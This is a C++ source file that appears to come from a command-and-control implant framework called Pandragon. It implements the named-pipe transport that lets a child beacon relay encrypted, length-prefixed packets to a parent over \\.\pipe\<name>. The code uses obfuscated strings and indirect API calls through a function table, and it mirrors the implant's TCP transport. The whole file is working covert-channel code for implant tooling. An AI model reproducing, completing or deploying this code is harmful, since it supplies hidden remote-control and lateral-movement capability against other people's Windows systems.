#include "../../include/generated_config.h"
#ifdef PANDRAGON_ENABLE_PIPE
/*
 * pipe_transport.cpp: Named pipe transport (client mode, Phase 1)
 *
 * Child beacon connects to \\.\pipe\<name> via CreateFileW.
 * Sends/receives length-prefixed frames: [4B BE length][encrypted packet]
 *
 * Wire format matches TCP transport exactly.
 * No malleable wrapping on pipe; the pipe IS the transport, no HTTP dressing.
 *
 * uses static uint8_t buffer for send/recv framing.
 */

#include "pipe_transport.h"
#include "../../include/utils.h"
#include "../bastia/bastia.h"
#include "../../include/pandragon_runtime.h"

/* Static buffer for recv: avoids malloc per frame */
static uint8_t g_pipeRecvBuf[MAX_PIPE_BUFFER];

/* ============================================================================
 * Client mode: connect to named pipe
 * ============================================================================ */

HANDLE pipeConnect(functionTable* funcTable, const wchar_t* pipeName) {
    if (!funcTable || !pipeName) return INVALID_HANDLE_VALUE;

    /* Build full pipe path: \\.\pipe\<name> */
    wchar_t fullPath[MAX_PIPE_PATH];
    const wchar_t* prefix = lcg_encryptw(L"\\\\.\\pipe\\");

    /* Copy prefix */
    safeWcsCopyBounded(fullPath, prefix, MAX_PIPE_PATH);
    size_t nameLen = __wcslen(fullPath);

    /* Copy pipe name */
    safeWcsCopyBounded(fullPath + nameLen, pipeName, MAX_PIPE_PATH - nameLen);

    c_debugPrint(funcTable, "[pipe] Connecting to %ls", fullPath);

    /* Try WaitNamedPipe first (with 5s timeout) */
    if (funcTable->WaitNamedPipeW) {
        if (!funcTable->WaitNamedPipeW(fullPath, 5000)) {
            c_debugPrint(funcTable, "[pipe] WaitNamedPipe failed: %lu",
                         funcTable->GetLastError());
            return INVALID_HANDLE_VALUE;
        }
    }

    /* Connect to the pipe */
    HANDLE hPipe = funcTable->CreateFileW(
        fullPath,
        GENERIC_READ | GENERIC_WRITE,
        0,                          // no sharing
        NULL,                       // default security
        OPEN_EXISTING,
        0,                          // default attributes
        NULL
    );

    if (hPipe == INVALID_HANDLE_VALUE) {
        c_debugPrint(funcTable, "[pipe] CreateFileW failed: %lu",
                     funcTable->GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    /* Set pipe to message mode (for reliable framing) */
    if (funcTable->SetNamedPipeHandleState) {
        DWORD mode = PIPE_READMODE_MESSAGE;
        if (!funcTable->SetNamedPipeHandleState(hPipe, &mode, NULL, NULL)) {
            c_debugPrint(funcTable, "[pipe] SetNamedPipeHandleState warning: %lu",
                         funcTable->GetLastError());
            /* Non-fatal; continue in byte mode */
        }
    }

    c_debugPrint(funcTable, "[pipe] Connected to %ls", fullPath);
    return hPipe;
}

/* ============================================================================
 * Low-level send/recv (length-prefixed frames)
 * ============================================================================ */

bool pipeSendFrame(functionTable* funcTable, HANDLE hPipe,
                   const void* data, size_t dataLen) {
    if (!funcTable || hPipe == INVALID_HANDLE_VALUE || !hPipe) return false;

    /* Build 4-byte BE length prefix */
    uint8_t lenBuf[4];
    lenBuf[0] = (uint8_t)((dataLen >> 24) & 0xFF);
    lenBuf[1] = (uint8_t)((dataLen >> 16) & 0xFF);
    lenBuf[2] = (uint8_t)((dataLen >> 8) & 0xFF);
    lenBuf[3] = (uint8_t)(dataLen & 0xFF);

    /* Send length */
    DWORD written = 0;
    if (!funcTable->WriteFile(hPipe, lenBuf, 4, &written, NULL) || written != 4) {
        c_debugPrint(funcTable, "[pipe] Send length failed: %lu",
                     funcTable->GetLastError());
        return false;
    }

    /* Send data */
    if (dataLen > 0) {
        if (!funcTable->WriteFile(hPipe, (LPVOID)data, (DWORD)dataLen, &written, NULL)
            || written != (DWORD)dataLen) {
            c_debugPrint(funcTable, "[pipe] Send data failed: %lu (wrote %lu/%zu)",
                         funcTable->GetLastError(), (unsigned long)written, dataLen);
            return false;
        }
    }

    c_debugPrint(funcTable, "[pipe] Sent %zu bytes", dataLen);
    return true;
}

std::pair<void*, size_t> pipeRecvFrame(functionTable* funcTable, HANDLE hPipe) {
    if (!funcTable || hPipe == INVALID_HANDLE_VALUE || !hPipe) return { nullptr, 0 };

    /* Read 4-byte length prefix */
    uint8_t lenBuf[4] = {0};
    DWORD read = 0;

    if (!funcTable->ReadFile(hPipe, lenBuf, 4, &read, NULL) || read != 4) {
        c_debugPrint(funcTable, "[pipe] Recv length failed: %lu (got %lu)",
                     funcTable->GetLastError(), (unsigned long)read);
        return { nullptr, 0 };
    }

    uint32_t frameLen = ((uint32_t)lenBuf[0] << 24) |
                        ((uint32_t)lenBuf[1] << 16) |
                        ((uint32_t)lenBuf[2] << 8)  |
                        ((uint32_t)lenBuf[3]);

    if (frameLen == 0) return { nullptr, 0 };

    /* Sanity cap: max_response_size from config */
    uint32_t max_response_size = 67108864;
    PandragonRuntime& runtime = PandragonRuntime::getInstance();
    max_response_size = runtime.getConfig().max_response_size;
    if (frameLen > max_response_size) {
        c_debugPrint(funcTable, "[pipe] Frame too large: %u bytes (max=%u)", (unsigned)frameLen, (unsigned)max_response_size);
        return { nullptr, 0 };
    }

    /* Use static buffer if it fits, otherwise malloc */
    if (frameLen <= MAX_PIPE_BUFFER) {
        DWORD totalRead = 0;
        while (totalRead < frameLen) {
            DWORD toRead = frameLen - totalRead;
            if (!funcTable->ReadFile(hPipe, g_pipeRecvBuf + totalRead, toRead, &read, NULL)
                || read == 0) {
                c_debugPrint(funcTable, "[pipe] Recv body failed: %lu (got %lu/%u)",
                             funcTable->GetLastError(), (unsigned long)totalRead, (unsigned)frameLen);
                return { nullptr, 0 };
            }
            totalRead += read;
        }

        /* Copy to malloc'd buffer for caller */
        void* out = __malloc(frameLen + 1);
        if (!out) return { nullptr, 0 };
        __memcpy(out, g_pipeRecvBuf, frameLen);
        ((uint8_t*)out)[frameLen] = '\0';
        return { out, (size_t)frameLen };
    }

    /* Large frame: malloc directly */
    uint8_t* buf = (uint8_t*)__malloc(frameLen + 1);
    if (!buf) return { nullptr, 0 };

    DWORD totalRead = 0;
    while (totalRead < frameLen) {
        DWORD toRead = frameLen - totalRead;
        if (!funcTable->ReadFile(hPipe, buf + totalRead, toRead, &read, NULL)
            || read == 0) {
            c_debugPrint(funcTable, "[pipe] Recv large body failed: %lu",
                         funcTable->GetLastError());
            __free(buf);
            return { nullptr, 0 };
        }
        totalRead += read;
    }

    buf[frameLen] = '\0';
    c_debugPrint(funcTable, "[pipe] Received %u bytes", (unsigned)frameLen);
    return { buf, (size_t)frameLen };
}

/* ============================================================================
 * High-level: request/response (matches TransportRequestFn)
 * ============================================================================ */

std::pair<void*, size_t> pipeSocketRequest(
    functionTable* funcTable,
    const wchar_t*   host,         // pipe name
    const wchar_t*   /*dest*/,     // ignored
    const wchar_t*   /*userAgent*/,// ignored
    uint16_t         /*port*/,     // ignored
    const void*      bodyData,
    size_t           bodyLen
) {
    c_debugPrint(funcTable, "[pipe] Connecting to pipe: %ls (body=%zu bytes)",
                 host ? host : L"(null)", bodyLen);

    if (!host || host[0] == L'\0') {
        c_debugPrint(funcTable, "[pipe] No pipe name provided");
        return { nullptr, 0 };
    }

    /* Connect to pipe */
    HANDLE hPipe = pipeConnect(funcTable, host);
    if (hPipe == INVALID_HANDLE_VALUE) {
        return { nullptr, 0 };
    }

    /* Send request frame */
    if (bodyData && bodyLen > 0) {
        if (!pipeSendFrame(funcTable, hPipe, bodyData, bodyLen)) {
            c_debugPrint(funcTable, "[pipe] Send failed");
            funcTable->NtClose(hPipe);
            return { nullptr, 0 };
        }
    }

    /* Receive response frame */
    auto result = pipeRecvFrame(funcTable, hPipe);

    /* Close pipe; each request is a new connection (stateless like HTTP) */
    funcTable->NtClose(hPipe);

    return result;
}
#endif
